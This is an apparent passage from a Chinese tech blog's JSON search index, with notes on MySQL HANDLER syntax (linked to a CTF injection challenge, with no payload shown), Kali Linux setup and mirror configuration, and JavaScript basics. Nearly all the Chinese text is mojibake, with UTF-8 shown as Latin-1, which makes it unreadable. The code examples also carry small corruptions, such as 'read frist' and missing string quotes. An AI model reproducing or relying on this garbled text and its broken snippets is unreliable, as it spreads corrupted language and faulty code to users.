[ [AS] alias]HANDLER tbl_name READ index_name = | = | = | | (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name FIRST | NEXT | PREV | LAST [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ FIRST | NEXT [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE HANDLER tbl_name OPEN [ [AS] alias] handler tablename open; /å¼€å¯tablenameè¡¨hand tablename open as new_tablename; /è¿½åŠ tablenameçš„è¡¨çš„åˆ«åä¸ºnew_tablenameï¼Œæ­¤å¤„ä¸æ˜¯ä¿®æ”¹ï¼Œä¸”åªåœ¨å½“å‰ä¼šè¯å†…ç”Ÿæ•ˆ HANDLER tbl_name READ index_name = | = | = | | (value1,value2,...)[ WHERE where_condition ] [LIMIT ... ] handler tablename read Keyname=(test1); /è¯»å–tablenameè¡¨çš„ç´¢å¼•åä¸ºKeynameçš„å€¼ä¸ºtest1çš„æ•´è¡Œä¿¡æ¯(æ¯å¼ è¡¨éƒ½ä¼šé»˜è®¤æœ‰ç´¢å¼•åˆ—ï¼‰ HANDLER tbl_name READ index_name FIRST | NEXT | PREV | LAST [ WHERE where_condition ] [LIMIT ... ] handler tablename read listname first; /è¯»å–tablenameè¡¨çš„åˆ—åä¸ºlistnameçš„ç¬¬ä¸€ä¸ªå€¼çš„æ•´è¡Œä¿¡æ¯ HANDLER tbl_name READ FIRST | NEXT [ WHERE where_condition ] [LIMIT ... ] handler tablename read first; /è¯»å–tablenameè¡¨çš„ç¬¬ä¸€è¡Œä¿¡æ¯ã€‚handler tablename read next; /è¯»å–tablenameè¡¨çš„ä¸‹ä¸€è¡Œä¿¡æ¯ã€‚handler tablename read first limit 0,2; /è¯»å–tablenameè¡¨çš„å‰ä¸¤è¡Œä¿¡æ¯ã€‚ HANDLER tbl_name CLOSE handler tablename close /é€€å‡ºhandlerä¼šè¯ï¼ˆå®ƒäºhandler ... openæ˜¯ç›¸å¯¹çš„ï¼‰ ä¾‹å¦‚ï¼š å·²çŸ¥ä¸€å¼ è¡¨åä¸ºtablenameï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸‹è¿°è¯­å¥ handler tablename open;handler tablename read frist;handler tablename close; æˆ– handler tablename open as test;handler test read frist;handler test close; åº”ç”¨-[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨","tags":["MySQL"],"categories":["æ•°æ®åº“"]},{"title":"kaliä¼˜åŒ–","path":"/2025/07/09/kaliä¼˜åŒ–/","content":"è¿™æ˜¯ä¸€ç¯‡æœ‰å…³kaliåŸºç¡€ä¼˜åŒ–çš„æ–‡ç«  kaliä¼˜åŒ– kaliè§£å‹æ‰“å¼€é»˜è®¤å¯†ç ä¸ºï¼škali è®¾ç½®ä¸­æ–‡ æ‰“å¼€Terminalï¼Œè¾“å…¥å‘½ä»¤ï¼š shellsudo dpkg-reconfigure locales è¿›å…¥åä½¿ç”¨é”®ç›˜çš„â†‘+â†“â†ï¼Œåˆ°æœ€åº•éƒ¨ï¼Œæ‰¾åˆ° [ ] zh_CN.UTF-8 UTF-8 ï¼ŒæŒ‰ç©ºæ ¼é”®é€‰ä¸­ï¼Œå†æŒ‰å›è½¦è¿›å…¥ä¸‹ä¸€ä¸ªé¡µé¢ï¼Œå†é€‰ä¸­ zh_CN.UTF-8ä½œä¸ºé»˜è®¤è¯­è¨€ï¼Œåå›è½¦ ç­‰å¾…ä¸‹è½½ç»“æŸåé‡å¯å³å¯ æ¢æº å› ä¸ºå®˜æ–¹æºéƒ½æ˜¯çš„é€Ÿåº¦æ…¢ï¼Œæ‰€ä»¥é€‰æ‹©æ¢å›½å†…æº æ‰“å¼€Terminalï¼Œè¾“å…¥å‘½ä»¤ shellsudo vim /etc/apt/sources.list å¯é€‰çš„å›½å†…æº plaintext#é˜¿é‡Œäº‘æºdeb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#ä¸­ç§‘å¤§æºdeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#æ¸…åå¤§å­¦æºdeb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.tuna.tsinghua.edu.cn//kali kali-rolling main non-free contrib#æµ™å¤§æºdeb http://mirrors.zju.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.zju.edu.cn/kali kali-rolling main non-free contrib ä¸æ‡‚vimè¯­æ³•çš„æŒ‰ä»¥ä¸‹æ­¥éª¤æ¥ å…¨é€‰åˆ é™¤åŸæœ¬çš„å†…å®¹ æŒ‰escé”®åï¼Œå…ˆæŒ‰ g gï¼ˆåˆ°è¾¾é¡¶éƒ¨ï¼‰ï¼Œç„¶åå†æŒ‰ d G(åŒºåˆ†å¤§å°å†™ï¼ï¼ï¼) å¤åˆ¶ä»¥ä¸Šå†…å®¹ï¼Œå³é”®ç²˜è´´ ä¿å­˜é€€å‡º æŒ‰escé”®åï¼ŒåŒæ—¶æŒ‰ä½shifté”®å’Œè‹±æ–‡:é”®ï¼Œå†è¾“å…¥wq ç³»ç»Ÿä¼˜åŒ– 1.è®¾ç½®rootè´¦æˆ·å¯†ç  shellsudo passwd root 2.è®¾ç½®ç¦æ­¢ä¼‘çœ  æ‰“å¼€å·¦ä¸Šè§’kaliå›¾æ ‡ ç‚¹å‡»settings(è®¾ç½®) ç‚¹å‡»è¿›å…¥power Manger(ç”µæºç®¡ç†å™¨) åœ¨Power Manager é€‰æ‹©â€” display(æ˜¾ç¤º) æŠŠä½¿ç”¨ç”µæ± å’Œæ’å…¥ç”µæºä¸‹çš„ä¾æ¬¡æŠŠBlank afterã€Put to sleep afterå’ŒSwitch off after å…¨éƒ¨è®¾ç½®æˆä¸º Never 3.è½¯ä»¶æ•°æ®åº“æ›´æ–°ï¼š plaintextapt-get update 4.è½¯ä»¶æ›´æ–°ï¼š plaintextapt-get upgrade 5.ç³»ç»Ÿæ›´æ–°ï¼š plaintextapt-get dist-upgrade å®‰è£…ä¸­æ–‡è¾“å…¥æ³• æ›´æ–°åŒ…ç®¡ç†å™¨çš„è½¯ä»¶åŒ…åˆ—è¡¨ï¼š plaintextsudo apt-get update å®‰è£…fcitxè¾“å…¥æ³•æ¡†æ¶ï¼š plaintextsudo apt-get install fcitx å®‰è£…fcitx-googlepinyinè°·æ­Œæ‹¼éŸ³è¾“å…¥æ³•ï¼š plaintextsudo apt-get install fcitx-googlepinyin ctrl+space(ç©ºæ ¼)åˆ‡æ¢è¾“å…¥æ³• ç•Œé¢ç¾åŒ– 1.æ•´ä½“å­—ä½“æ”¾å¤§ æ‰“å¼€å·¦ä¸Šè§’kaliå›¾æ ‡ ç‚¹å‡»è®¾ç½®è¿›å…¥å¤–è§‚ é€‰æ‹©å­—ä½“ï¼Œä¿®æ”¹DPI 1.æ¡Œé¢å›¾æ ‡å¤§å° æ¡Œé¢å³é”®é€‰æ‹©æ¡Œé¢è®¾ç½® é€‰æ‹©å›¾æ ‡ï¼Œè°ƒèŠ‚å›¾æ ‡å¤§å°å®Œæˆå¯¹æ¡Œé¢å›¾æ ‡çš„è°ƒèŠ‚ã€‚ï¼ˆè¿™æ­¥ä¹Ÿå¯ä»¥è®¾ç½®å›¾æ ‡ä¸‹çš„å­—ä½“ è‡ªå®šä¹‰å¤§å°ï¼‰ 2.èœå•æ å¤§å°ä»¥åŠä½ç½® åœ¨èœå•æ ç©ºç™½å¤„å³é”®â€”é€‰æ‹©é¢æ¿å†ç‚¹å‡»é¢æ¿é¦–é€‰é¡¹ æ‰“å¼€é¢æ¿åé€‰æ‹©æ˜¾ç¤ºâ€”å°ºå¯¸â€”è°ƒèŠ‚è¡Œå¤§å° å…³é—­é”å®šé¢æ¿ï¼Œå¯æ‹–åŠ¨ä½œç”¨ä¸¤ä¾§çš„å°ç‚¹å°†é¢æ¿æ”¾ç½®äºæœ€ä¸‹ä¾§ 3.ç»ˆç«¯å­—ä½“ æ‰“å¼€ç»ˆç«¯å†ç‚¹å‡»å·¦ä¸Šè§’æ–‡ä»¶ç‚¹å‡»å‚æ•°è®¾ç½® æ‰“å¼€è®¾ç½®ç•Œé¢ï¼Œç•Œé¢è®¾ç½®â€”è°ƒèŠ‚å­—ä½“å¤§å° 4.ç³»ç»Ÿå­—ä½“ æ‰“å¼€å·¦ä¸Šè§’kaliå›¾æ ‡ ç‚¹å‡»è®¾ç½®è¿›å…¥å¤–è§‚ é€‰æ‹©å­—ä½“ï¼Œä¿®æ”¹é»˜è®¤å­—ä½“å’Œé»˜è®¤ç­‰å®½å­—ä½“ 4.çª—å£å­—ä½“ æ‰“å¼€å·¦ä¸Šè§’kaliå›¾æ ‡ ç‚¹å‡»è®¾ç½®è¿›å…¥çª—å£ç®¡ç†å™¨ é€‰æ‹©æ ·å¼ä¿®æ”¹æ ‡é¢˜å­—ä½“ kali mysqlç™»å½•é—®é¢˜ ä¸çŸ¥ç”¨æˆ·åå’Œå¯†ç ï¼ˆç”¨rootè¯•è¿‡ä¸è¡Œï¼‰ï¼Œæˆ‘ä»¬è‡ªè¡Œæ›´æ”¹rootç”¨æˆ·çš„å¯†ç  ä½¿ç”¨ sudo ç™»å½• MySQLï¼šsudo mysql ç¡®å®šæ•°æ®åº“ç‰ˆæœ¬ SELECT VERSION(); MariaDBç‰ˆæœ¬ ä½¿ç”¨ä»¥ä¸‹ SQL è¯­æ³•æ¥ä¿®æ”¹ root ç”¨æˆ·çš„å¯†ç  SET PASSWORD FOR root@localhost = PASSWORD(your_new_password);æˆ– UPDATE mysql.user SET password = PASSWORD(your_new_password) WHERE user = root AND host = localhost; MySQLç‰ˆæœ¬ ALTER USER root@localhost IDENTIFIED BY your_new_password; åˆ·æ–°æƒé™ FLUSH PRIVILEGES; å¦‚æœä»¥ä¸Šæ–¹æ³•ä»ç„¶ä¸èµ·ä½œç”¨ï¼Œå¯èƒ½æ˜¯ç”±äºæƒé™é—®é¢˜ã€‚å¯ä»¥æ£€æŸ¥ root ç”¨æˆ·çš„æƒé™é…ç½®ï¼š SELECT user, host, authentication_string, plugin FROM mysql.user WHERE user=root; ç¡®è®¤ root ç”¨æˆ·æ˜¯å¦å…·æœ‰æ­£ç¡®çš„æƒé™ï¼Œå¹¶ä¸”æ’ä»¶æ˜¯å¦é…ç½®ä¸º mysql_native_passwordï¼Œæˆ–è€…å¯ä»¥é€šè¿‡ unix_socket æ¥è¿›è¡Œèº«ä»½éªŒè¯ 0.0.0.0","tags":["è™šæ‹Ÿæœº","kali"],"categories":["kaliè™šæ‹Ÿæœº"]},{"title":"JavaScript","path":"/2025/07/09/JavaScript/","content":"JavaScript HTML ä¸­çš„ Javascript è„šæœ¬ä»£ç å¿…é¡»ä½äº script ä¸ /script æ ‡ç­¾é—´ Javascript è„šæœ¬ä»£ç å¯è¢«æ”¾ç½®åœ¨ HTML é¡µé¢çš„ body å’Œ head ä¸­ JavaScript è¾“å‡º JavaScript æ²¡æœ‰ä»»ä½•æ‰“å°æˆ–è€…è¾“å‡ºçš„å‡½æ•° ä½¿ç”¨ window.alert() å¼¹å‡ºè­¦å‘Šæ¡†æ¥æ˜¾ç¤ºæ•°æ® ä½¿ç”¨ innerHTML å†™å…¥åˆ° HTML å…ƒç´  document.getElementById(â€œdemoâ€) ç”¨ id å±æ€§(æ ‡è¯† HTML å…ƒç´ )æ¥æŸ¥æ‰¾ HTML å…ƒç´ çš„ JS ä»£ç  **innerHTML = â€œæ®µè½å·²ä¿®æ”¹ã€‚â€**ç”¨äºä¿®æ”¹å…ƒç´ çš„ HTML å†…å®¹(innerHTML)çš„JS ä»£ç  ä½¿ç”¨ document.write() æ–¹æ³•å°†å†…å®¹å†™åˆ° HTML æ–‡æ¡£ä¸­ ç”¨ document.write() å¯ä»¥å‘æ–‡æ¡£å†™å…¥å†…å®¹ã€‚ å¦‚æœåœ¨æ–‡æ¡£å·²å®ŒæˆåŠ è½½åæ‰§è¡Œ document.writeï¼Œæ•´ä¸ª HTML é¡µé¢å°†è¢«è¦†ç›–ã€‚ ä½¿ç”¨ console.log() å†™å…¥åˆ°æµè§ˆå™¨çš„æ§åˆ¶å° ä½¿ç”¨ console.log() æ–¹æ³•åœ¨æµè§ˆå™¨ä¸­( F12 æ¥å¯ç”¨è°ƒè¯•æ¨¡å¼ï¼Œ åœ¨è°ƒè¯•çª—å£ä¸­ç‚¹å‡» â€œConsoleâ€ èœå•)æ˜¾ç¤º JavaScript å€¼ JavaScript è¯­æ³• å­—é¢é‡ æ•°å­—ï¼ˆNumberï¼‰å­—é¢é‡ å¯ä»¥æ˜¯æ•´æ•°æˆ–è€…æ˜¯å°æ•°ï¼Œæˆ–è€…æ˜¯ç§‘å­¦è®¡æ•°(e)ã€123e5=12300000ã€‘ å­—ç¬¦ä¸²ï¼ˆStringï¼‰å­—é¢é‡ å¯ä»¥ä½¿ç”¨å•å¼•å·æˆ–åŒå¼•å· è¡¨è¾¾å¼å­—é¢é‡ ç”¨äºè®¡ç®— æ•°ç»„ï¼ˆArrayï¼‰å­—é¢é‡ å®šä¹‰ä¸€ä¸ªæ•°ç»„ [40, 100, 1, 5, 25, 10] å¯¹è±¡ï¼ˆObjectï¼‰å­—é¢é‡ å®šä¹‰ä¸€ä¸ªå¯¹è±¡ {firstName:â€œJohnâ€, lastName:â€œDoeâ€, age:50, eyeColor:â€œblueâ€} å‡½æ•°ï¼ˆFunctionï¼‰å­—é¢é‡ å®šä¹‰ä¸€ä¸ªå‡½æ•° function myFunction(a, b) { return a * b;} å˜é‡ å˜é‡ç”¨äºå­˜å‚¨æ•°æ®å€¼ï¼Œä½¿ç”¨å…³é”®å­— var æ¥å®šä¹‰å˜é‡ï¼Œ ä½¿ç”¨ç­‰å·æ¥ä¸ºå˜é‡èµ‹å€¼ è¯­å¥ ç”¨äºå‘æµè§ˆå™¨å‘å‡ºå‘½ä»¤ï¼ˆè¯¦è§ä¸‹èŠ‚ï¼‰ æ•°æ®ç±»å‹ æ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼Œæ•°ç»„ï¼Œå¯¹è±¡ç­‰ å‡½æ•° JavaScript è¯­å¥ JavaScript è¯­å¥æ˜¯å‘ç»™æµè§ˆå™¨çš„å‘½ä»¤ï¼Œå‘Šè¯‰æµè§ˆå™¨è¦åšçš„äº‹æƒ… åˆ†å· ; åœ¨æ¯æ¡å¯æ‰§è¡Œçš„è¯­å¥ç»“å°¾æ·»åŠ åˆ†å·æˆ–åœ¨ä¸€è¡Œä¸­ç¼–å†™å¤šæ¡è¯­å¥ ä»£ç  æ˜¯ JavaScript è¯­å¥çš„åºåˆ—ã€‚æµè§ˆå™¨æŒ‰ç…§ç¼–å†™é¡ºåºä¾æ¬¡æ‰§è¡Œæ¯æ¡è¯­å¥ã€‚ document.getElementById(demo).innerHTML=ä½ å¥½ Dolly; document.getElementById(myDIV).innerHTML=ä½ æœ€è¿‘æ€ä¹ˆæ ·?; ä»£ç å— ä»£ç å—çš„ä½œç”¨æ˜¯ä¸€å¹¶åœ°æ‰§è¡Œè¯­å¥åºåˆ—ï¼Œå·¦èŠ±æ‹¬å·å¼€å§‹ï¼Œä»¥å³èŠ±æ‹¬å·ç»“æŸ è¯­å¥æ ‡è¯†ç¬¦ ç©ºæ ¼ JavaScript ä¼šå¿½ç•¥å¤šä½™çš„ç©ºæ ¼ æŠ˜è¡Œ ä½¿ç”¨åæ–œæ å¯¹ä»£ç è¡Œè¿›è¡Œæ¢è¡Œ JavaScript å˜é‡ å˜é‡å£°æ˜ ç”¨ var å…³é”®è¯æ¥å£°æ˜å˜é‡ï¼Œå˜é‡å¯ä»¥å…ˆä½¿ç”¨å†å£°æ˜ å¤šå˜é‡ åœ¨ä¸€æ¡è¯­å¥ä¸­å£°æ˜å¾ˆå¤šå˜é‡ï¼šè¯¥è¯­å¥ä»¥ var å¼€å¤´ï¼Œå¹¶ä½¿ç”¨é€—å·åˆ†éš”å˜é‡ var lastname=Doe, age=30, job=carpenter; æ¨ªè·¨å¤šè¡Œ var lastname=Doe,age=30,job=carpenter; ä¸€æ¡è¯­å¥ä¸­å£°æ˜çš„å¤šä¸ªå˜é‡ä¸å¯ä»¥åŒæ—¶èµ‹åŒä¸€ä¸ªå€¼ var x,y,z=1; x,y ä¸º undefinedï¼Œ z ä¸º 1ã€‚ é‡æ–°å£°æ˜å˜é‡ é‡æ–°å£°æ˜ JavaScript å˜é‡ï¼Œè¯¥å˜é‡çš„å€¼ä¸ä¼šä¸¢å¤± var carname=Volvo;var carname; ä¸¤æ¡è¯­å¥æ‰§è¡Œåï¼Œå˜é‡ carname çš„å€¼ä¾ç„¶æ˜¯ â€œVolvoâ€ å˜é‡ç±»å‹ JavaScript å˜é‡å¯ç”¨äºå­˜æ”¾å€¼ï¼ˆ x=5ï¼‰ï¼Œè¡¨è¾¾å¼ï¼ˆz=x+yï¼‰å’Œæ–‡æœ¬å€¼ (name=â€œBill Gatesâ€ ç”¨åŒå¼•å·æˆ–å•å¼•å·åŒ…å›´è¿™ä¸ªå€¼)ï¼Œä¸€èˆ¬å€¡å¯¼ä»¥å­—æ¯å¼€å¤´ JavaScript æ•°æ®ç±»å‹ å€¼ç±»å‹(åŸºæœ¬ç±»å‹)ï¼šå­—ç¬¦ä¸²ï¼ˆStringï¼‰ã€æ•°å­—(Number)ã€å¸ƒå°”(Boolean)ã€ç©ºï¼ˆNullï¼‰ã€æœªå®šä¹‰ï¼ˆUndefinedï¼‰ã€Symbol å¼•ç”¨æ•°æ®ç±»å‹ï¼ˆå¯¹è±¡ç±»å‹ï¼‰ï¼šå¯¹è±¡(Object)ã€æ•°ç»„(Array)ã€å‡½æ•°(Function)ï¼Œè¿˜æœ‰ä¸¤ä¸ªç‰¹æ®Šçš„å¯¹è±¡ï¼šæ­£åˆ™ï¼ˆRegExpï¼‰å’Œæ—¥æœŸï¼ˆDateï¼‰ å˜é‡çš„æ•°æ®ç±»å‹å¯ä»¥ä½¿ç”¨ typeof æ“ä½œç¬¦æ¥æŸ¥çœ‹ JavaScript æ•°ç»„ JavaScript ä¸æ”¯æŒä½¿ç”¨åå­—æ¥ç´¢å¼•æ•°ç»„ï¼Œåªå…è®¸ä½¿ç”¨æ•°å­—ç´¢å¼• å¦‚æœä½ ä½¿ç”¨åå­—ä½œä¸ºç´¢å¼•ï¼Œå½“è®¿é—®æ•°ç»„æ—¶ï¼ŒJavaScript ä¼šæŠŠæ•°ç»„é‡æ–°å®šä¹‰ä¸ºæ ‡å‡†å¯¹è±¡ã€‚ æ‰§è¡Œè¿™æ ·æ“ä½œåï¼Œæ•°ç»„çš„æ–¹æ³•åŠå±æ€§å°†ä¸èƒ½å†ä½¿ç”¨ï¼Œå¦åˆ™ä¼šäº§ç”Ÿé”™è¯¯ï¼ˆperson.lengthè¾“å‡ºä¸º0ï¼‰ ä½¿ç”¨ new Array() æ„é€ å‡½æ•°ï¼Œé€šè¿‡ .length è·å–æ•°ç»„é•¿åº¦ var cars=new Array();cars[0]=Saab;cars[1]=Volvo;cars[2]=BMW; var cars=new Array(Saab,Volvo,BMW); JavaScript å¯¹è±¡ å¯¹è±¡ç”±èŠ±æ‹¬å·åˆ†éš”ã€‚åœ¨æ‹¬å·å†…éƒ¨ï¼Œå¯¹è±¡çš„å±æ€§ä»¥åç§°å’Œå€¼å¯¹çš„å½¢å¼ (name : value) æ¥å®šä¹‰ å¯¹è±¡å±æ€§ä¸¤ç§è®¿é—®æ–¹å¼ å¯¹è±¡æ–¹æ³• å¯¹è±¡çš„æ–¹æ³•å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶ä½œä¸ºå¯¹è±¡çš„å±æ€§å­˜å‚¨ã€‚å¯¹è±¡æ–¹æ³•é€šè¿‡æ·»åŠ  () è°ƒç”¨ (ä½œä¸ºä¸€ä¸ªå‡½æ•°)ã€‚ typeofï¼ŒUndefined å’Œ Null typeof æ“ä½œç¬¦æ¥æ£€æµ‹å˜é‡çš„æ•°æ®ç±»å‹ typeof John // è¿”å› stringtypeof 3.14 // è¿”å› numbertypeof NaN // è¿”å› numbertypeof false // è¿”å› booleantypeof [1,2,3,4] // è¿”å› objecttypeof name:John, age:34 // è¿”å› objecttypeof new Date() // è¿”å› objecttypeof function () // è¿”å› functiontypeof myCar // è¿”å› undefined (å¦‚æœ myCar æ²¡æœ‰å£°æ˜)typeof null // è¿”å› object Undefined è¿™ä¸ªå€¼è¡¨ç¤ºå˜é‡ä¸å«æœ‰å€¼ã€‚ä»»ä½•å˜é‡éƒ½å¯ä»¥é€šè¿‡è®¾ç½®å€¼ä¸º undefined æ¥æ¸…ç©º null è¡¨ç¤º â€œä»€ä¹ˆéƒ½æ²¡æœ‰â€ï¼Œä½†ç±»å‹ä¸ºå¯¹è±¡ï¼Œæ˜¯ä¸€ä¸ªåªæœ‰ä¸€ä¸ªå€¼çš„ç‰¹æ®Šç±»å‹ã€‚è¡¨ç¤ºä¸€ä¸ªç©ºå¯¹è±¡å¼•ç”¨ã€‚å¯ä»¥è®¾ç½®ä¸º null æ¥æ¸…ç©ºå˜é‡ã€‚ åœ¨å¸¸è§„çš„æ¯”è¾ƒ==ä¸­ï¼Œæ•°æ®ç±»å‹æ˜¯è¢«å¿½ç•¥çš„ åœ¨ä¸¥æ ¼çš„æ¯”è¾ƒè¿ç®—ä¸­ï¼Œ=== ä¸ºæ’ç­‰è®¡ç®—ç¬¦ï¼ŒåŒæ—¶æ£€æŸ¥è¡¨è¾¾å¼çš„å€¼ä¸ç±»å‹ JavaScript å‡½æ•° è°ƒç”¨å¸¦å‚æ•°çš„å‡½æ•° å˜é‡å’Œå‚æ•°å¿…é¡»ä»¥ä¸€è‡´çš„é¡ºåºå‡ºç°ï¼ˆç¬¬ä¸€ä¸ªå˜é‡å°±æ˜¯ç¬¬ä¸€ä¸ªè¢«ä¼ é€’çš„å‚æ•°çš„ç»™å®šçš„å€¼ï¼‰ å¸¦æœ‰è¿”å›å€¼çš„å‡½æ•° ä½¿ç”¨ return è¯­å¥æ—¶ï¼Œå‡½æ•°ä¼šåœæ­¢æ‰§è¡Œï¼Œå¹¶è¿”å›æŒ‡å®šçš„å€¼ JavaScript ä½œç”¨åŸŸ ä½œç”¨åŸŸä¸ºå¯è®¿é—®å˜é‡ï¼Œå¯¹è±¡ï¼Œå‡½æ•°çš„é›†åˆ JavaScript å±€éƒ¨ä½œç”¨åŸŸ å±€éƒ¨å˜é‡ï¼šåªèƒ½åœ¨å‡½æ•°å†…éƒ¨è®¿é—®ï¼Œå±€éƒ¨å˜é‡åœ¨å‡½æ•°å¼€å§‹æ‰§è¡Œæ—¶åˆ›å»ºï¼Œå‡½æ•°æ‰§è¡Œå®Œåå±€éƒ¨å˜é‡ä¼šè‡ªåŠ¨é”€æ¯ï¼Œä¸åŒçš„å‡½æ•°å¯ä»¥ä½¿ç”¨ç›¸åŒåç§°çš„å˜é‡ JavaScript å…¨å±€å˜é‡ å…¨å±€å˜é‡æœ‰ å…¨å±€ä½œç”¨åŸŸ: ç½‘é¡µä¸­æ‰€æœ‰è„šæœ¬å’Œå‡½æ•°å‡å¯ä½¿ç”¨ å¦‚æœå˜é‡åœ¨å‡½æ•°å†…æ²¡æœ‰å£°æ˜ï¼ˆæ²¡æœ‰ä½¿ç”¨ var å…³é”®å­—ï¼‰ï¼Œè¯¥å˜é‡ä¸ºå…¨å±€å˜é‡ JavaScript å­—ç¬¦ä¸² JavaScript å­—ç¬¦ä¸²ç”¨äºå­˜å‚¨å’Œå¤„ç†æ–‡æœ¬ å­—ç¬¦ä¸²çš„ç´¢å¼•ä» 0 å¼€å§‹ï¼Œè¿™æ„å‘³ç€ç¬¬ä¸€ä¸ªå­—ç¬¦ç´¢å¼•å€¼ä¸º [0]ï¼Œç¬¬äºŒä¸ªä¸º [1]ï¼Œä»¥æ­¤ç±»æ¨ ç‰¹æ®Šå­—ç¬¦ åæ–œæ æ˜¯ä¸€ä¸ªè½¬ä¹‰å­—ç¬¦ã€‚ è½¬ä¹‰å­—ç¬¦å°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸ºå­—ç¬¦ä¸²å­—ç¬¦ ä¾‹å¦‚ï¼šå¯ä»¥åœ¨å­—ç¬¦ä¸²ä¸­ä½¿ç”¨å¼•å·ï¼Œå­—ç¬¦ä¸²ä¸­çš„å¼•å·ä¸è¦ä¸å­—ç¬¦ä¸²çš„å¼•å·ç›¸åŒï¼ˆä½†å¯ä»¥åœ¨å­—ç¬¦ä¸²æ·»åŠ è½¬ä¹‰å­—ç¬¦æ¥ä½¿ç”¨å¼•å·ï¼‰ å­—ç¬¦ä¸²é•¿åº¦ ä½¿ç”¨å†…ç½®å±æ€§ length æ¥è®¡ç®—å­—ç¬¦ä¸²çš„é•¿åº¦ æ¨¡æ¿å­—ç¬¦ä¸² æ¨¡æ¿å­—ç¬¦ä¸²ä¸­å¯ä»¥åŒæ—¶ä½¿ç”¨å•å¼•å·å’ŒåŒå¼•å· æ¨¡æ¿å­—ç¬¦ä¸²è¿˜æ”¯æŒå¤šè¡Œæ–‡æœ¬ï¼Œè€Œæ— éœ€ä½¿ç”¨ç‰¹æ®Šçš„è½¬ä¹‰å­—ç¬¦ï¼š æ¨¡æ¿å­—é¢é‡è¿˜å¯ä»¥åŒ…å«å ä½ç¬¦â€”â€”ä¸€ç§ç”±ç¾å…ƒç¬¦å·å’Œå¤§æ‹¬å·åˆ†éš”çš„åµŒå…¥å¼è¡¨è¾¾å¼ï¼š${expression} JavaScript è¿ç®—ç¬¦ ç”¨äºå­—ç¬¦ä¸²çš„ + è¿ç®—ç¬¦ + è¿ç®—ç¬¦ç”¨äºæŠŠæ–‡æœ¬å€¼æˆ–å­—ç¬¦ä¸²å˜é‡åŠ èµ·æ¥ï¼ˆè¿æ¥èµ·æ¥ï¼‰ å¦‚éœ€æŠŠä¸¤ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²å˜é‡è¿æ¥èµ·æ¥ï¼Œè¯·ä½¿ç”¨ + è¿ç®—ç¬¦ è¦æƒ³åœ¨ä¸¤ä¸ªå­—ç¬¦ä¸²ä¹‹é—´å¢åŠ ç©ºæ ¼ï¼Œéœ€è¦æŠŠç©ºæ ¼æ’å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¹‹ä¸­æˆ–è€…æŠŠç©ºæ ¼æ’å…¥è¡¨è¾¾å¼ä¸­(txt3=txt1+ +txt2) **è§„åˆ™:**å¦‚æœæŠŠæ•°å­—ä¸å­—ç¬¦ä¸²ç›¸åŠ ï¼Œç»“æœå°†æˆä¸ºå­—ç¬¦ä¸²ï¼ æ¡ä»¶è¿ç®—ç¬¦ variablename=(condition)?value1:value2 åŠ æ³•æ˜¯ä¸¤ä¸ªæ•°å­—ç›¸åŠ ã€‚ è¿æ¥æ˜¯ä¸¤ä¸ªå­—ç¬¦ä¸²è¿æ¥ã€‚ var x = 10 + 5; // x çš„ç»“æœä¸º 15var x = 10 + 5; // x çš„ç»“æœä¸º 105 JavaScriptå¾ªç¯ åœ¨ switch è¯­å¥ä¸­ï¼Œç”¨æ’ç­‰è®¡ç®—ç¬¦(===)è¿›è¡Œæ¯”è¾ƒ var x = 10;switch(x) case 10: alert(Hello); ä¸Šä¾‹ä¼šå‡ºç°å¼¹çª— JavaScript ç±»å‹è½¬æ¢ constructor å±æ€§ constructor å±æ€§è¿”å›æ‰€æœ‰ JavaScript å˜é‡çš„æ„é€ å‡½æ•° John.constructor // è¿”å›å‡½æ•° String() [native code] (3.14).constructor // è¿”å›å‡½æ•° Number() [native code] false.constructor // è¿”å›å‡½æ•° Boolean() [native code] [1,2,3,4].constructor // è¿”å›å‡½æ•° Array() [native code] name:John, age:34.constructor // è¿”å›å‡½æ•° Object() [native code] new Date().constructor // è¿”å›å‡½æ•° Date() [native code] function () .constructor // è¿”å›å‡½æ•° Function() [native code] JavaScript ç±»å‹è½¬æ¢ JavaScript å˜é‡å¯ä»¥è½¬æ¢ä¸ºæ–°å˜é‡æˆ–å…¶ä»–æ•°æ®ç±»å‹ å°†æ•°å­—è½¬æ¢ä¸ºå­—ç¬¦ä¸² å…¨å±€æ–¹æ³• String() å¯ä»¥å°†æ•°å­—ï¼Œå­—æ¯ï¼Œå˜é‡ï¼Œè¡¨è¾¾å¼è½¬æ¢ä¸ºå­—ç¬¦ä¸² String(x) String(123) Number æ–¹æ³• toString() ä¹Ÿæ˜¯ x.toString() (123).toString() æ–¹æ³• æè¿° toExponential() æŠŠå¯¹è±¡çš„å€¼è½¬æ¢ä¸ºæŒ‡æ•°è®¡æ•°æ³•ã€‚ toFixed() æŠŠæ•°å­—è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œç»“æœçš„å°æ•°ç‚¹åæœ‰æŒ‡å®šä½æ•°çš„æ•°å­—ã€‚ toPrecision() æŠŠæ•°å­—æ ¼å¼åŒ–ä¸ºæŒ‡å®šçš„é•¿åº¦ã€‚ å°†å¸ƒå°”å€¼è½¬æ¢ä¸ºå­—ç¬¦ä¸² å…¨å±€æ–¹æ³• String() Boolean æ–¹æ³• toString() å°†æ—¥æœŸè½¬æ¢ä¸ºå­—ç¬¦ä¸² Date() è¿”å›å­—ç¬¦ä¸²ã€‚ Date() å…¨å±€æ–¹æ³• String() å¯ä»¥å°†æ—¥æœŸå¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ String(new Date()) Date æ–¹æ³• toString() ä¹Ÿæœ‰ç›¸åŒçš„æ•ˆæœã€‚ obj = new Date()obj.toString() æ–¹æ³• æè¿° getDate() ä» Date 